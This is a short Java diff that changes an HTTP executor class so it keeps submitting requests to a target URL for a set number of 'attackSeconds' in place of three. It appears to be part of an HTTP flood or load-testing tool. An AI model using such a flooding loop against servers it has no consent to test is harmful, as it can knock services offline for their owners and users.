@@ -26,12 +26,20 @@ public class HttpParralelExecutorBG implements Callable<Long> {
         @Override
         public Long call() throws Exception {
                 // Thread.sleep(5000);
+                long endTime = System.currentTimeMillis()+(this.attackSeconds*1000);
 
-                for(int i = 0; i < 3; i++) {
-                        this.jobQueue.submit(new HttpRequest(this.targetUrl));
+                while (true) {
+                        if (System.currentTimeMillis()<endTime) {
+                                // System.out.println("put");
+                                this.jobQueue.submit(new HttpRequest(endTime,this.targetUrl));
+                        } else {
+                                System.out.println("break");
+                                break;
+                        }
                 }
-                this.executorService.shutdown();
-                System.out.println("call4");
+                // this.executorService.shutdown();
+                this.executorService.shutdownNow();
+                System.out.println("shutdownNow");
                 return 1l;
         }
 }
